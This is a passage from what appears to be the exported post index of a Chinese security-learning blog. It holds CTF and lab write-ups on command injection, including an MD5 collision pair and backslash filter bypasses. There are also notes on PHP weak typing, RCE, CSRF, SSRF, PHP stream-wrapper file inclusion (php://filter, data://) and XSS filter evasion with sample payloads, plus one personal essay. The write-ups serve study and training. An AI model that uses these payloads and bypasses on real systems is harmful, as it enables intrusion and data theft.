src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.navigation.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.buttons.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.tabs.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.tooltips.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.accordion.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.placeholder.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.alerts.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.topbar.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.joyride.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.clearing.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.magellan.js&quot;&gt;&lt;&#x2F;script&gt;  \n  --&gt;  \n  &lt;!-- Included JS Files (Compressed) --&gt;\n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.js&quot;&gt;&lt;&#x2F;script&gt;\n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;foundation.min.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;!-- Initialize JS Plugins --&gt;\n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;app.js&quot;&gt;&lt;&#x2F;script&gt;  \n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n可以看到，很多命令都被过滤了\nif (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\&#96;|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;\n    echo(&quot;forbid ~&quot;);\n\n但只要符合下面的条件就可以执行命令\nif ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;\n       echo &#96;$cmd&#96;;\n   &#125; \n\n这里绕过MD5函数的比较，又因为强行进行了string转换，所以我们这里不能进行数组绕过md5；所以这里需要构造出满足这样条件的md5；\nPOST：\na&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2\n&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n\n\n\n0x04由于过滤了很多命令，但查看目录的命令dir没有被禁用；查看一下当前目录有没有flag：\nPOST &#x2F;index.php?cmd&#x3D;dir\n\n\n当前目录中没有flag，去根目录找一下flag：\nPOST &#x2F;index.php?cmd&#x3D;dir%20&#x2F;\n\n\n有flag文件。\n读取flag，由于cat被禁用了，但在linux命令中可以加反斜杠(\\)进行逃逸：\n\n得到flag。\n或者可以使用sort &#x2F;flag进行读取：\n（Linux sort命令用于将文本文件内容加以排序。）\n查看目录也可以使用反斜杠(\\)逃逸：\nPOST &#x2F;index.php?cmd&#x3D;l\\s%20&#x2F;\n\n\n0x05 总结这里难点主要在于MD5的强类型绕过；linux命令的熟悉程度和反斜杠逃逸。\n参考文章：\n浅谈MD5强类型碰撞：\nhttps://baijiahao.baidu.com/s?id=1691028605507773400&amp;wfr=spider&amp;for=pc\nMD5强类型绕过：\nhttps://blog.csdn.net/weixin_43332695/article/details/119349204\nhttps://blog.csdn.net/CSDNiamcoming/article/details/108837347\n","slug":"东塔靶场-CTF-命令执行-2","date":"2022-03-16T00:50:33.000Z","categories_index":"CTF","tags_index":"CTF","author_index":"Aurora"},{"id":"34ee629d2bfd49882af5b4a30f7de5be","title":"攻防世界-web-backup","content":"前言记录一下攻防世界新手区，web-backup这道题。关于index.php的备份文件。\n0x00启动靶场，看到：你知道index.php的备份文件名吗？\n\n0x01使用搜索引擎\n\n0x02在地址栏输入：index.php.bak，可以看到备份文件下载完成\n\n\n0x03打开备份文件，拿到flag\n\n0x04 总结主要记录一下index.php的备份文件是什么，以后遇到起码不陌生。\n","slug":"攻防世界-web-backup","date":"2022-03-15T09:19:29.000Z","categories_index":"CTF","tags_index":"CTF","author_index":"Aurora"},{"id":"475a4194f2b842990d8398d70f0c7aaf","title":"php弱类型","content":"前言在CTF平台做题时，遇到很多php弱类型的题目，也看了很多php弱类型的文章，在这里总结一下。\n0x00php中有两种比较的符号 == 与 ===\n1 &lt;?php\n2 $a = $b ;\n3 $a===$b ;\n4 ?>\n\n=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较\n== 在进行比较的时候，会先将字符串类型转化成相同，再比较\n这里明确了说如果一个数值和字符串进行比较的时候，会将字符串转换成数值\n1 &lt;?php\n2 var_dump(\"admin\"==0);  //true\n3 var_dump(\"1admin\"==1); //true\n4 var_dump(\"admin1\"==1) //false\n5 var_dump(\"admin1\"==0) //true\n6 var_dump(\"0e123456\"==\"0e4456789\"); //true \n7 ?> \n\n\n\n1 观察上述代码，&quot;admin&quot;&#x3D;&#x3D;0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等\n2 &quot;1admin&quot;&#x3D;&#x3D;1 比较的时候会将1admin转化成数值,结果为1，而“admin1“&#x3D;&#x3D;1 却等于错误，也就是&quot;admin1&quot;被转化成了0,为什么呢？？\n3 &quot;0e123456&quot;&#x3D;&#x3D;&quot;0e456789&quot;相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等\n\n对于上述的问题查了php手册\n当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含&#39;.&#39;,&#39;e&#39;,&#39;E&#39;并且其数值值在整形的范围之内\n该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。\n\n1 &lt;?php\n2 $test=1 + \"10.5\"; // $test=11.5(float)\n3 $test=1+\"-1.3e3\"; //$test=-1299(float)\n4 $test=1+\"bob-1.3e3\";//$test=1(int)\n5 $test=1+\"2admin\";//$test=3(int)\n6 $test=1+\"admin2\";//$test=1(int)\n7 ?>\n\n所以就解释了”admin1”&#x3D;&#x3D;1 &#x3D;&gt;False 的原因\n0x01 总结这些php弱类型只是冰山一角 上述验证了代码审计的重要性\n参考原文：\nhttps://www.cnblogs.com/Mrsm1th/p/6745532.html\n","slug":"php弱类型","date":"2022-03-15T08:32:55.000Z","categories_index":"CTF","tags_index":"CTF,PHP","author_index":"Aurora"},{"id":"63b4d5992a8dc61b2cccec272a36e569","title":"墨者学院-命令执行","content":"#命令执行注入\n0x00启动靶场环境\n\n0x01提示输入ip地址\n\n先测试一下\n\n可以看到成功ping的返回信息。\n0x02接下来尝试使用管道符执行ls命令查看目录\n\n这里判断的时候出现弹窗提示ip格式不对，先看下源码是不是前端验证\n\n果然，那这里的话就需要绕过前端验证。\n0x03抓包进行绕过\n\n目录中有key文件\n0x04使用cat命令打开key文件\n\n无回显，因该是有过滤\n0x05添加&lt;绕过过滤，成功得到key\n\n0x06提交key，完成\n\nPHP代码分析溯源(第4题)0x00启动靶场\n\n0x01提示key在根目录，而且还有一段base64加密的php代码，先试着解密查看内容\n\n0x02解密出来是REQUEST请求，a是参数，也是可控变量，那这里利用a做文章\n\n0x03http:&#x2F;&#x2F;124.70.71.251:42767&#x2F;f.php?a&#x3D;ls\n\n得到目录，有key存在\n\n0x04http:&#x2F;&#x2F;124.70.71.251:42767&#x2F;f.php?a&#x3D;cat%20key_5986251809730.php\n\n查看源码得到key\n\n0x05提交key，完成\n\n","slug":"墨者学院-命令执行","date":"2022-03-13T01:39:21.000Z","categories_index":"RCE","tags_index":"CTF,RCE,靶场","author_index":"Aurora"},{"id":"99ef65eed770437be60664bb9539a369","title":"RCE代码及命令执行漏洞","content":"前言在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。\n脑图：\n\nRCE漏洞原理RCE(remote command&#x2F;code execute，远程命令执行)漏洞，一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。\n直白一点：\nRCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE分为远程命令执行ping和远程代码执行evel。\n检测RCE漏洞涉及系统命令执行函数：\nsystem()\npassthru()\nexec()\nshell_exec()\npopen()\nproc_open()\npcntl_exec()\n\n黑盒测试：网站中有特殊功能，比如Ping、数据库备份等等。\n白盒测试：查看命令执行函数是否做过滤。命令执行函数如下：\n​    PHP代码执行函数：eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()\n​    PHP命令执行函数：system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()\nRCE漏洞危害高危：\n直接获取服务器权限；\n获取敏感数据，文件；\n写入恶意文件getshell。\nRCE漏洞利用windows下管道符“;”：执行完前面的语句再执行后面的语句。\n“|”：显示后面语句的执行结果。\n“||”：当前面的语句执行出错时，执行后面的语句。\n“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。\n“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。\n\n\n\nlinux下管道符“;”：执行完前面的语句再执行后面的语句。 \n“|”：显示后面语句的执行结果。 \n“||”：当前面的语句执行出错时，执行后面的语句。\n“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。 “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真\n\n\n\n##RCE漏洞防范:\n1、在进入危险函数前进行严格的检测和过滤；\n2、尽量不要使用命令执行函数。\n","slug":"RCE代码及命令执行漏洞","date":"2022-03-12T07:42:14.000Z","categories_index":"RCE","tags_index":"RCE","author_index":"Aurora"},{"id":"929e59ca2c7119d6b3905dcf4adc61b6","title":"CSRF靶场","content":"环境准备1、靶场环境：Pikachu-CSRF\n2、攻击机：Win10\nCSRF（get）0x00首先进行登录：\n0x01抓包构造伪链接：\n\n0x02构造url伪链接，将地址修改为china：\npikachu-master&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;15988767673&amp;add&#x3D;china&amp;email&#x3D;kobe@pikachu.com&amp;submit&#x3D;submit\n\n\n伪造修改成功。\n注意：必须为用户登录状态。\n##CSRF（post）\n0x00\n0x01先抓个包\n\n出现访问目录，url和提交的表单，由于是基于post，那这里伪造就需要伪造一个表单了进行后续的操作。\n0x02利用burpsuit构造CSRF POC来伪造表单：\n\n0x03修改地址为china\n\n0x04生成攻击脚本\n\n0x05访问伪造的url，点击submit request\n\n0x06可以看到信息已经被修改\n\n注意：无论CSRF是基于GET方式或是基于POST方式，都需要在用户登录的情况下进行。\n##CSRF（Taken）\n0x00\n基于Taken的CSRF：敏感请求中加入了Token，从而不易进行伪造。在每次请求中，都会加入一个随机码，后台每次都会对提交请求中的Token值进行优先比较。\n0x01token防止跨站请求伪造的原理：在浏览器访问网站A时，网站A设置cookie会增加随机值token，这个值是随机的。返回给浏览器时，cookie会储存在浏览器，同时会把token传给表单里面的隐藏字段。所以当浏览器用自己的表单时会自带token，网站A取到这个值和cookie里的token一致就通过。而网站B里面的表单没有这个值，所以不能通过，这样就阻止了恶意攻击。非表单也是这样的原理。\n","slug":"CSRF靶场","date":"2022-03-08T03:07:17.000Z","categories_index":"CSRF","tags_index":"CSRF,靶场","author_index":"Aurora"},{"id":"019bd9770b9072b146cab74b0206ca70","title":"SSRF基础","content":"SSRF漏洞概述SSRF，全称Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器发起请求的一个安全漏洞，SSRF的主要攻击目标为外网无法访问的内部系统。\n以下为SSRF脑图：\n\nSSRF漏洞原理SSRF形成的原因是服务端提供了从其他服务器应用获取数据的功能，在用户可控的情况下，未对目标地址进行过滤与限制，导致了此漏洞的产生。\n大多数web应用都提供了从其他的服务器上获取数据的功能。使用指定的URL，web应用便可以获取图片，下载文件，读取文件内容等。SSRF的实质是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。\n\nSSRF漏洞危害1.内外网的端口和服务扫描\n2.攻击运行在内网或本地的应用程序\n3.对内网web应用进行指纹识别，识别企业内部的资产信息\n4.攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）\n5.利用file协议读取本地敏感数据文件等\nSSRF漏洞攻击1、获取web应用可达服务器服务的banner信息以及收集内网web应用的指纹识别， 如开放的端口，中间件版本信息等。 \n2、攻击运行在内网的系统或应用程序，获取内网各系统弱口令进行内网漫游、对有 漏洞的内网web应用实施攻击获取webshell，如st2命令执行、discuz ssrf通过redis 实施getshell等。 \n3、利用有脆弱性的组件结合**ftp:&#x2F;&#x2F;，file:&#x2F;&#x2F;&#x2F;，gopher:&#x2F;&#x2F;，dict:&#x2F;&#x2F;**等协议实施攻击。如 FFmpeg任意文件读取，xxe攻击等。\n漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等。\n各个协议调用探针：http,file,dict,ftp,gopher 等。\nSSRF防御策略1、过滤返回信息，验证远程服务器对请求的响应是比较容易的方法； \n2、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态； \n3、限制请求的端口为http常用的端口，比如，80,443,8080,8090； \n4、黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网； \n5、禁用不需要的协议。仅允许http和https请求； \n6、使用正则对参数进行效验，防止畸形请求绕过黑名单。\n参考文章：https://www.t00ls.net/articles-41070.html\n","slug":"SSRF基础","date":"2022-02-28T11:46:22.000Z","categories_index":"SSRF","tags_index":"SSRF","author_index":"Aurora"},{"id":"62ffee5f16300f5ee280e534fb47e7f9","title":"CSRF基础","content":"前言在跨站的世界中，CSRF同样扮演者及其重要的角色。CSRF全称为Cross Site Request Forgery，即跨站请求伪造。CSRF很容易与XSS混淆，所以，这里需要注意两个关键点：跨站点的请求与请求是伪造的。\n跨站点的请求：跨站点的请求是其他站点或者恶意请求可能来自本站。\n请求是伪造的：如果的请求的发出不是用户的意愿，那么这个请求就是伪造的。\nCSRF原理CSRF攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的Web应用程序，去执行并非用户本意的操作。\n图解：\n\n\n由上图可知，若要完成一次CSRF攻击，受害者必须依次完成两个步骤：\n1、登录受信任的网站，并在本地生成Cookie。\n2、在没有退出受信任网站的情况下访问恶意构造的网站。\nCSRF漏洞检测手工检测\nCSRF只能通过用户受信任的网站操作进行攻击,实际上就是劫持用户操作。\n在检测前首先需要确定Web应用程序的所有功能\n以及确定哪些操作是敏感的\n比如修改密码、转账、发表留言等功能\n\n1、首先需要抓取用户的数据包，在数据包中搜集信息\n2、手工编写CSRF POC\n3、提交POC查看内容是否被修改\n工具检测利用Brupsuit抓取用户数据包，再自动生成CSRF POC进行检测。\nCSRF攻击类型GET型CSRF 攻击抓取用户访问受信任网站的数据包获取到Cookie，然后再恶意网站上编写一个CSRF页面，利用img标签的src属性指向目标网站，之后欺骗用户访问CSRF页面。\n注意三个关键点：\n1、跨域发出了一个GET请求；\n2、可以无JavaScript参与；\n3、请求是身份认证后的。\nPOST型CSRF 攻击通过JavaScript自动生成一份表单，表单的action地址指向目标网站的某个地址，表单的相关字段都准备好，写入构造CSRF页面中，即可发出请求。当目标网站的用户被欺骗访问恶意网站的CSRF页面，一个跨域伪造的POST表单请求就发出了，同样，请求中带有目标网站的Cookie。\n###HTML CSRF 攻击\n在HTML中设置src&#x2F;href等链接地址的标签都可以发出一个GET请求，例：\n&lt;link href=\"\">\n&lt;img src=\"\">\n&lt;img lowsrc=\"\">\n&lt;iframe src=\"\">\n......\n\nCSS样式中的：\n@import &quot;&quot;\nbackground:url(&quot;&quot;)\n......\n\n以上是发出GET请求，POST请求只能通过form提交方式。\n还有另外两种方式：\nJSON HiJacking 攻击\nFlash CSRF 攻击\nCSRF危害1、篡改目标网站上的用户数据\n2、盗取用户隐私数据\n3、作为其他攻击向量的辅助攻击手法 \n4、传播CSRF蠕虫\nCSRF防御策略1、尽量使用POST，限制GET：由于GET接口只需要构造一个img标签即可实行CSRF攻击；但POST也不是万无一失，攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性。\n2、浏览器Cookie策略\n3、加验证码：验证码，强制用户必须与应用进行交互，才能完成最终请求。\n4、检验Referer来源：请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）\n5、设置随机Token：利用Token的随机性\n","slug":"CSRF基础","date":"2022-02-27T13:48:11.000Z","categories_index":"CSRF","tags_index":"CSRF","author_index":"Aurora"},{"id":"eac6c9303fed0a97a442c644f7607a6d","title":"CTF文件包含","content":"前言在CTF在线平台解题时遇到CTF形式的文件包含漏洞，记录一下解题思路。\nCTF文件包含以BUUCTF一道题为例：[ACTF2020 新生赛]Include 1\n###0x00\n打开靶机环境提示：\n\n###0x01\n点击tips：\n\n0x02可以看到有 ?file&#x3D;flag.php，而这里文件包含需要读取文件源码，也就意味需要读取flag.php文件的源码，而这里显示的是文件内容。\n因此，利用以下payload读取文件源码：\nphp://filter/read=convert.base64-encode/resource=xxx.php\n\n\n\n0x03构造payload：\n?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php\n\n\n可以看到出现Base64编码后的源码；\n0x04解码得到flag：\n\n0x05最重要的就是读取文件的payload。\n参考文章：\nhttps://blog.csdn.net/qq_42181428/article/details/87090539?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.contr\n常见PHP为协议0x00 file:&#x2F;&#x2F;作用：\n\n\n\n\n\n\n\n\n\n用于访问文件（绝对路径、相对路径、网络路径）\n示例：\n\n\n\n\n\n\n\n\n\nhttp:&#x2F;&#x2F;www.xx.com?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passswd\n0x01 php:&#x2F;&#x2F;作用：访问输入输出流\n1、php:&#x2F;&#x2F;filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。\npayload：\nhttp:&#x2F;&#x2F;xxx.xxx.xxx.xxx:端口号&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php\n\n参数：\n\n\n\n\n\n\n\n\n\nresource&#x3D;&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流read&#x3D;&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write&#x3D;&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。\nhttps://www.leavesongs.com/PENETRATION/php-filter-magic.html\n2、php:&#x2F;&#x2F;input\n作用：\n\n\n\n\n\n\n\n\n\n执行POST数据中的php代码\npayload:\nhttp:&#x2F;&#x2F;xxx.x.x.x&#x2F;cmd.php?cmd&#x3D;php:&#x2F;&#x2F;input\n\n\n\n\n\n\n\n\n\n\nPOST数据：**&lt;?php phpinfo()?&gt;**\n注意：\n\n\n\n\n\n\n\n\n\nenctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的\n0x02 data:&#x2F;&#x2F;作用：\n\n\n\n\n\n\n\n\n\ndata:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到**base64编码**传输\npayload:\nhttp:&#x2F;&#x2F;xxx.x.x.x&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n\n","slug":"CTF文件包含","date":"2022-02-24T10:45:14.000Z","categories_index":"CTF","tags_index":"CTF,PHP,靶场","author_index":"Aurora"},{"id":"41cf39073a339a1c767bb13d5641e6de","title":"xss跨站-WAF绕过及安全修复","content":"前言xss跨站之WAF绕过及安全修复的介绍\n常规WAF绕过思路标签语法替换：&lt;a&gt;的href，&lt;img&gt;的src等\n特殊符号干扰：~@#￥%……&amp;*等\n提交方式更改： post，get方式\n垃圾数据溢出：添加大量垃圾数据进行干扰\n加密解密算法：unicode编码等\n结合其他漏洞绕过\n（几乎和其他漏洞绕过WAF方式差不多）\n参考文章：https://bbs.pediy.com/thread-250852.htm\n##自动化工具\nXSStrike\n字典大全：https://github.com/TheKingOfDuck/fuzzDicts\nXSSFuzz：https://xssfuzzer.com/fuzzer.html\n安全修复方案1、开启 httponly,输入过滤，输出过滤等\n2、JAVA防护参考文章：https://www.cnblogs.com/baixiansheng/p/9001522.html\n","slug":"xss跨站-WAF绕过及安全修复","date":"2022-02-24T07:30:44.000Z","categories_index":"xss","tags_index":"Bypass WAF,xss","author_index":"Aurora"},{"id":"44cb2462aeef047cd96dfb6cf67ce343","title":"人生","content":"随便说说吧有时候发现很多事情，很多东西其实并不是你想的那样，或许这个世界也不是我们想的那样，有人会把世界想的很好，有人会把世界想的很坏，可偏偏世界不好也不坏。曾经老是听别人说什么命运有一部分是掌握在自己手里的，这句话我不否认，也不肯定。这里不得不说命运中含有运气的成分，假如所有人都会掌握好自己手里的那部分命运，但后来或许会发生一些事情，导致你会怀疑自己的命运的一部分真的是由自己掌控的吗？其实并不然，自己或许只能掌控10%左右，剩下的全看运气。有时会想，世上没有十全十美的人，应该和这个道理差不多吧。说到运气，又让我想起了玄学，不得不说，世间万物藕断丝连，可能会牵扯到一些神乎其玄的东西。有时可能你苦苦追寻的东西，到最后不过是竹篮打水一场空，反观那些无心插柳柳成荫的人可能才是最后的赢家。这就是命运吗，可能我是在为我自己的无能找的借口罢了。后来，再不相信什么任何东西任何人，只想自己安安静静的做一些事情，无论什么事情，只要自己随心就好，不争不抢，随心自由。人生的得失莫过于此。有时还会想，人活着到底为了什么，结婚生子？还是生老病死。虽然最后的结局都一样，化作一抔黄土，但人还是要坚持活着。其实，换个角度想想，我也只是个普通人，站在人群里一样是人群中的那一个，毫不起眼，我并非天选之子，何必苦苦追寻一些莫须有的东西，可转念一想，人生或许正是如此，一辈子什么也带不来，最后什么也带不走，途中只不过寻求一些在世上存在过的痕迹罢了。最近老是看到大厂员工因工作劳累导致抢救无效的帖子，就会想：大学辛辛苦苦的钻研计算机知识，他们好不容易凭借自己的努力进了大厂，到最后没走到人生的尽头，看风景的途中就化为一抔黄土。难道人生就是努力过后就得面对现实吗？想想自己的过往，身边的朋友，有那个人是真心为自己的，或许时代真的变了，那个年代的真情随着时间的流逝到现在已经不复存在，也许还存在，但不会在我这里存在。有时其实一个人挺好的，做些自己想做的事，抛开一些烦心的事去放空自己，远离喧嚣厌恶的世界，反观会清净不少。有时的我会产生厌世心理，或许这也是原因之一吧。厌世归厌世，但终究我是活在这个世界当中的一粒尘埃，毫不起眼罢了。这个世界也不会因为我自己的厌世心理而改变什么，唯有能改变就是我自己的内心了。\n很喜欢纪伯伦的一句话：\n如果有一天，\n你不再寻找爱情，只是去爱；\n你不再渴望成功，只是去做；\n你不再追求空泛的成长，只是开始修养自己的性情；\n你的人生，才真正的开始。\n​                                           —纪伯伦\n","slug":"人生","date":"2022-02-24T04:28:11.000Z","categories_index":"人生感悟","tags_index":"人生感悟","author_index":"Aurora"},{"id":"42f7b323120f691383c67796cc3bfd08","title":"xss过滤的那些事","content":"前言由于实战当中避免不了拦截xss跨站攻击，由此需要了解过滤xss的方式有哪些，以及去如何绕过。\nHttp OnlyHttpOnly是包含在http返回头Set-Cookie里面的一个附加的flag，所以它是后端服务器对cookie设置的一个附加的属性，在生成cookie时使用HttpOnly标志有助于减轻客户端脚本访问受保护cookie的风险（如果浏览器支持的话）。通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击。\n简单来说就是：如果在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息。\n注：这里要明确的一点是，Http Only是防止xss读取cookie，不阻止xss语句。\nHttp Only绕过思路一般获取后台权限无非是通过获取cookie进入后台，或者是直接账号密码登录。由于网站启用Http Only无法获取cookie的情况下 ，只能通过获取账号密码进行登录。\n1、保存账号密码：网站管理员可能设置浏览器保存账号密码，这样的情况下可以通过xss获取保存的账号密码。\n2、未保存账号密码-表单劫持：后台管理员在输入账号密码的同时，触发跨站语句，账号密码既发送给服务端，又发送给攻击者。（一般是在登录框页面触发xss语句，若xss语句未在登录框触发，这种方式是不可行的）\n代码过滤1、转义字符串：\n&lt;INPUT type&#x3D;&quot;text&quot; value&#x3D;&#39;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCRIPT&gt;&#39;&gt;\n&#39;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCRIPT&gt; 闭合前单引号\n&#39;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCRIPT&gt;&lt;xss a&#x3D;&#39; 闭合后单引号\n&lt;INPUT type&#x3D;&quot;text&quot; value&#x3D;&#39;&#39;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCRIPT&gt;&lt;xss a&#x3D;&#39;&#39;&gt;\n绕过语句\n\n2、绕过单引号过滤：字符实体\n\n\n\n&amp;#34;\n&amp;quot;\n&quot;\n双引号\n\n\n\n&amp;#38;\n&amp;amp;\n&amp;\n&amp;符号\n\n\n&amp;#60;\n&amp;lt;\n&lt;\n小于号\n\n\n&amp;#62;\n&amp;gt;\n&gt;\n大于号\n\n\n使用&amp;quot;或者&amp;#34;来代替我们的双引号，有时候可以绕过过滤。\n3、绕过&lt;SCRIPT&gt;过滤：有些过滤器会过滤到&lt;script&gt;标签，上面的例子就都废了。那就是用事件处理器进行插入语句，例：\n&lt;BODY onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;\n在 html 里啊。这个 Onload 关键字就是一个事件，其他的所有标签都没有这个属性，但是 Body标签是有的。但是，有一定的局限性，如果 onload事件在你的代码之前已经被处理了。也可以使用其他处理器，根据情况而定。\n4、使用 IMG 源：Html 中最常用的两个标签 img 和 &lt;a&gt;的href属性 一般是不会过滤的，一个指定图片，一个指定超链接。最危险的是img 标签。例：\n&lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;\n5、使用制表符, 换行符和回车符等符号：\n例：&lt;IMG SRC=&quot;java&amp;#x9ascript:alert(&#39;XSS&#39;);&quot;&gt;，为了漆面过滤器。\n\n\n\nType\nHorizontal Tab\nNew line\nCarriage Return\n\n\n\nURL\n%09\n%10\n%13\n\n\nMinimal Sized Hex\n&amp;#x9\n&amp;#xA\n&amp;#xD\n\n\nMaximum Sized Hex\n&amp;#x0000009;\n&amp;#x000000A;\n&amp;#x000000D;\n\n\nMinimum Sized Decimal\n&amp;#9\n&amp;#10\n&amp;#13\n\n\nMaximum Sized Decimal\n&amp;#x0000009;\n&amp;#x0000009;\n&amp;#x0000009;\n\n\n空字符：\n&lt;SCR%00IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\n空字符 (%00) 使得过滤器不能看到完整的 &lt;SCRIPT&gt;,只在 IE 6.0, IE 7.0 可以。\n6、双引号配对的bug：\n绕过这种过滤就是寻找闭合的标签，然后构造来突破：\n比如：&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt;&quot;&gt;\n通常我们认为，img 